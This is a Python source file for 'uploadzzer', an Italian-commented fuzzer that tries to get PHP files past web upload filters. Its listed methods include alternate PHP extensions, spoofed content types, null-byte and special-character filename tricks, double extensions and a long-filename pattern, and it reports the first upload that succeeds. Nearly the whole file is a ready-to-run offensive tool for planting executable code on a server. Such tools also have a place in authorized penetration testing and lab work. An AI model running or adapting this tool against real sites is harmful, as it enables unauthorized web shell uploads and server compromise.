import argparse, requests, os, random

####################################### GLOBALS VARS

####################################### Estensioni valide per php
# possono essere aggiunte manualmente le maiuscole
estensioni_php = [".php", ".pHp", ".phP2", ".php2", ".php3", ".php4", ".php5", ".php6", ".php7", ".phps", ".pht", ".phtm", ".phtml", ".pgif", ".shtml", ".htaccess", ".phar", ".inc", ".hphp", ".ctp", ".module"]
####################################### Special chars
special_chars = ['/', '\\', '%00', '\x00', '', '%20', '%0a', '%p', '%0d', '%0d%0a', '<', '>', '.']
####################################### Dizionario contType (possibile espansione)
content_types = {
    'txt': 'text/plain',
    'html': 'text/html',
    'jpeg': 'image/jpeg',
    'jpg': 'image/jpeg',
    'png': 'image/png',
    'pdf': 'application/pdf',
    'doc': 'application/msword',
    'docx': 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    'zip': 'application/zip',
    'php': 'application/x-httpd-php',
    'phtml': 'application/x-httpd-php',
    
}

####################################### Support Methods

def print_menu():
    ####################################### Stampa ascii art
    print(
    """
              _______  _        _______  _______  ______   _______  _______  _______  _______ 
    |\     /|(  ____ )( \      (  ___  )(  ___  )(  __  \ / ___   )/ ___   )(  ____ \(  ____ )
    | )   ( || (    )|| (      | (   ) || (   ) || (  \  )\/   )  |\/   )  || (    \/| (    )|
    | |   | || (____)|| |      | |   | || (___) || |   ) |    /   )    /   )| (__    | (____)|
    | |   | ||  _____)| |      | |   | ||  ___  || |   | |   /   /    /   / |  __)   |     __)
    | |   | || (      | |      | |   | || (   ) || |   ) |  /   /    /   /  | (      | (\ (   
    | (___) || )      | (____/\| (___) || )   ( || (__/  ) /   (_/\ /   (_/\| (____/\| ) \ \__
    (_______)|/       (_______/(_______)|/     \|(______/ (_______/(_______/(_______/|/   V1.0

    By Kannone94                                                            
    - Feel free to clone, edit and add functionalities
        if you contribute also add your name after mine

     _[TT]_j__,(  PHP       ,__i_[TT]_
    (_)oooo(_)'   Payloads )'(_)oooo(_)
    Bulldozer ascii by Krzysztof Biolik 
    """
    )

def print_help():
    help_text = """

    Usage:
        python3 uploadzzer.py -u "url" -f "path/to/file" -e "Discriminatory error on response" [Options]
        Examples:
        - python3 uploadzzer.py -u "http://localhost/" -f "/home/kali/Documents/file.php" -e "Sorry, you are not allowed to upload this type of files" --methods="full"
        - python3 (required ad above)... --proxy=127.0.0.1:8080 --cookies="PHP=385398619836914; blabla=logged_in"
        - python3 (required ad above)... --permitted="jpg zip pdf" --methods="jre vbe"
    Options:
        -h, --help      Display this help message
        -u, --url       Url of the upload web page
        -f, --file      Specify complete path to file
        -e, --error     Discriminatory error on response
        --permitted     If you have access to the permitted file ext (whitelist) you can input that here
        --cookies       If you need to be autenticated
        --data          Other data to send with POST
        --proxy         You can send requests through a proxy eg:"127.0.0.1:8080"
        --methods       Input the methods you want to try to use: "", refer to the following
    Methods:
        Least invasive:
            # jre: just random php working ext
            # rct: random content type
            # vbe: insert a valid ext before the .php
            # asc: append special characters at the end of the file name
            # tep: bypass the protections tricking the extension parser
            # eva: put a ex before the file and a valid ext at the end
            # vaf: put a valid ext after php
        More invasive:
            # dbv: concat two valid extensions
            # dbt: double trick parser, like dbv but append also null char to invalidate junk ext
            # lmb: Linux max bytes filename
            # full: full enum, try everything, may be invalid if response differ in some responses


    """
    print(help_text)

# il sender usato in tutto il programma
def send_file(file_path, upload_name, contType):
    files = {'file': (upload_name, open(file_path, 'rb'), contType)}
    proxies = None
    if proxy:
        proxies = {
            'http': 'http://' + proxy,
            'https': 'http://' + proxy
        }
        response = requests.post(url, files=files, cookies=cookies, proxies=proxies, data=data)
    else:
        response = requests.post(url, files=files, cookies=cookies, data=data)
    if error_string in response.text:
        print(f"Errore rilevato con: {upload_name}")
    else:
        print(response.text) # for debug
        print(f"Caricamento effettuato con successo: {upload_name}")
        exit()

######################################## manipolazione del contentType
def get_content_type(extension):
    if extension in content_types:
        return content_types.get(extension.lower())
    else:
        print("The tested valid extension is not in the local dictionay, a random ContentType will be used.")
        return get_random_content_type()

def get_random_content_type():
    return random.choice(list(content_types.values()))


####################################### Inizio metodi
# switch per i metodi: jre, ret, full  -- nella help page
# jre: just random ext
# rct: content type
# vbe: valid before
# asc: special characters
# tep: bypass the protections tricking the extension parser 
# vaf: put a valid ext after php
# dbv: concat two valid extensions
# dbt: double trick parser
# lmb: Linux max bytes filename
# full: full enum

#1st method, PHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module
def just_random_ext():
    for est in estensioni_php:
        nuovo_file = f"{nome_orig}{est}"
        send_file(path_completo, nuovo_file, 'application/x-httpd-php')

#2nd random ctype
def rand_cont_type():
    for value in content_types.values():
        send_file(path_completo, nome_file, value)

#3rd valid concat
def valid_before():
    for perm in perm_arr:
        crafted_filename = f"{nome_orig}.{perm}.{est_orig}"
        send_file(path_completo, crafted_filename, get_content_type(perm))


#4th special chars
def append_special_char():
    for special_char in special_chars:
        crafted_filename = f"{nome_file}{special_char}"
        send_file(path_completo, crafted_filename, 'application/x-httpd-php')

#5th bypass the protections tricking the extension parser + random ctype
def parse_trick():
    for special_char in special_chars:
        for perm in perm_arr:
            crafted_filename = f"{nome_orig}.{est_orig}{special_char}.{perm}"
            send_file(path_completo, crafted_filename, get_random_content_type())

#6th double valid
def double_valid():
    for perm in perm_arr:
        for perm2 in perm_arr:
            crafted_filename = f"{nome_orig}.{perm}.{perm2}.{est_orig}"
            send_file(path_completo, crafted_filename, get_random_content_type())

#7th valid concat
def valid_after():
    for perm in perm_arr:
        crafted_filename = f"{nome_orig}.{est_orig}.{perm}"
        send_file(path_completo, crafted_filename, 'application/x-httpd-php')

#8th valid concat
def ex_valid_after():
    for perm in perm_arr:
        crafted_filename = f"ex: {nome_orig}.{est_orig}.{perm}"
        send_file(path_completo, crafted_filename, 'application/x-httpd-php')

#9th double trick, this make a lot of req
def double_trick():
    for special_char in special_chars:
        for perm in perm_arr:
            for perm2 in perm_arr:
                crafted_filename = f"{nome_orig}.{est_orig}{special_char}.{perm}{special_char}.{perm2}"
                send_file(path_completo, crafted_filename, get_random_content_type())

#10th Linux max bytes
#Small guide: use the response to craft a file name = "A"*maxlen-4 and append .php.[valid_ext], than resend the req
def max_bytes():
    pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4"
    files = {'file': (pattern, open(path_completo, 'rb'), get_random_content_type())}
    proxies = None
    if proxy:
        proxies = {
            'http': 'http://' + proxy,
            'https': 'http://' + proxy
        }
        response = requests.post(url, files=files, cookies=cookies, proxies=proxies, data=data)
        print(response.text)
        # here do manual with burp or something
    else:
        response = requests.post(url, files=files, cookies=cookies, data=data)
        print(response.text)
        #here make a curl or other manual req to upload the file


############################################################ execution start ####################################################################
if __name__ == '__main__':

    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL dell'immagine da scaricare", required=True)
    parser.add_argument("-f", "--file", help="Percorso per il file", required=True)
    parser.add_argument("-e", "--error", help="Errore per Grep della risposta", required=True)
    parser.add_argument("--permitted", help="Estensioni di file consentite separate da spazi, senza punti: (eg: \"jpg png jpeg\")", default="jpg png jpeg")
    parser.add_argument("--cookies", help="Cookie da inviare al server", default="")
    parser.add_argument("--data", help="Altri dati da inviare", default="")
    parser.add_argument("--proxy", help="Inserisci il proxy", default="")
    parser.add_argument("--methods", help="Inserisci i metodi da utilizzare", default="jre rct")
    parser.add_argument('-h', '--help', action='store_true', help='Mostra la pagina di aiuto')

    args = parser.parse_args()

    ####################################### estraggo gli argomenti
    
    url = args.url
    path_completo = args.file
    error_string = args.error
    permitted_ext = args.permitted
    perm_arr = permitted_ext.rsplit(" ")
    cookies = args.cookies
    data = args.data
    proxy = args.proxy
    methods = args.methods
    methods_arr = methods.rsplit(" ")



    # Estraiamo il nome della directory in cui si trova il file
    #directory = os.path.dirname(path_completo)
    ####################################### nome file originale
    nome_file = os.path.basename(path_completo)
    nome_orig, est_orig = nome_file.rsplit(".", 1)

    

    if args.help:
        print_help()
        exit()

    print_menu()

    #Finire i vari switch

    for method in methods_arr:
        #1
        if method == "jre":
            just_random_ext()
        #2
        elif method == "rct":
            rand_cont_type()
        #3
        elif method == "vbe":
            valid_before()
        #4
        elif method == "asc":
            append_special_char()
        #5
        elif method == "tep":
            parse_trick()
        #6
        elif method == "dbv":
            double_valid()
        #7
        elif method == "vaf":
            valid_after()
        #8
        elif method == "eva":
            ex_valid_after()
        #9
        elif method == "dbt":
            double_trick()
        #10
        elif method == "lmb":
            max_bytes()
        #full
        elif method == "full":
            just_random_ext()
            rand_cont_type()
            valid_before()
            append_special_char()
            parse_trick()
            double_valid()
            valid_after()
            ex_valid_after()
            double_trick()
            max_bytes()
        else:
            print(f"Method: {method} is not valid!")

